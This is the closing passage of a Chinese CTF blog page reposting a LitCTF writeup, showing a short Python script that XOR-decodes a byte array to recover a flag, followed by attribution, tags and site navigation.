class="number">21</span> &gt;&gt; <span class="number">176</span> LOAD_FAST <span class="number">2</span> (result)</span><br><span class="line"> <span class="number">178</span> RETURN_VALUE</span><br><span class="line">a=[<span class="number">85</span>, <span class="number">84</span>, <span class="number">174</span>, <span class="number">227</span>, <span class="number">132</span>, <span class="number">190</span>, <span class="number">207</span>, <span class="number">142</span>, <span class="number">77</span>, <span class="number">24</span>, <span class="number">235</span>, <span class="number">236</span>, <span class="number">231</span>, <span class="number">213</span>, <span class="number">138</span>, <span class="number">153</span>, <span class="number">60</span>, <span class="number">29</span>, <span class="number">241</span>, <span class="number">241</span>, <span class="number">237</span>, <span class="number">208</span>, <span class="number">144</span>, <span class="number">222</span>, <span class="number">115</span>, <span class="number">16</span>, <span class="number">242</span>, <span class="number">239</span>, <span class="number">231</span>, <span class="number">165</span>, <span class="number">157</span>, <span class="number">224</span>, <span class="number">56</span>, <span class="number">104</span>, <span class="number">242</span>, <span class="number">128</span>, <span class="number">250</span>, <span class="number">211</span>, <span class="number">150</span>, <span class="number">225</span>, <span class="number">63</span>, <span class="number">29</span>, <span class="number">242</span>, <span class="number">169</span>]</span><br><span class="line">b=[<span class="number">19</span>, <span class="number">55</span>, <span class="number">192</span>, <span class="number">222</span>, <span class="number">202</span>, <span class="number">254</span>, <span class="number">186</span>, <span class="number">190</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    a[i] = a[i] ^ b[i % <span class="built_in">len</span>(b)]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(a[i]+<span class="number">6</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+---
+## 附图
+
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+
+---
+
+> **转载声明**：本文转载自 [Des-CTF-Knowledge](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge)（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。
+> 原文链接：[https://www.ctfiot.com/250466.html](https://www.ctfiot.com/250466.html)
+> 仓库原文：[CTF大赛WP集合/articles/2025_LitCTF_writeup_by_Mini-Venom.full.md](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/2025_LitCTF_writeup_by_Mini-Venom.full.md)
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/LitCTF-nest-js-%E7%88%86%E7%A0%B4-admin-password/">LitCTF nest_js 爆破 admin:password</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/01/01/ctf-kb/wp/Web/2025_-%E6%8B%9B%E5%95%86%E9%93%B8%E7%9B%BE-_%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%94%BB%E9%98%B2%E8%B5%9BWP/" title="2025&quot;招商铸盾&quot;智能网联汽车攻防赛 WP（Web 固件上传+Misc 数独+日志审计）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2025&quot;招商铸盾&quot;智能网联汽车攻防赛 WP（Web 固件上传+Misc 数独+日志审计）</div></div></a></div><div class="next-post pull-right"><a href="/2025/01/01/ctf-kb/wp/Web/2025-%E9%A2%86%E8%88%AA%E6%9D%AF-%E7%BD%91%E5%AE%89%E8%B5%9B%E9%A1%B9%E5%AD%A6%E7%94%9F%E7%BB%84%E5%88%9D%E8%B5%9BWP-%E4%B8%8A/" title="2025&quot;领航杯&quot;网安赛项学生组初赛 WP（上）（gin 整数溢出买 flag + math/rand 种子 1 + sudo CVE-2025-32463）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2025&quot;领航杯&quot;网安赛项学生组初赛 WP（上）（gin 整数溢出买 flag + math/rand 种子 1 + sudo CVE-2025-32463）</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
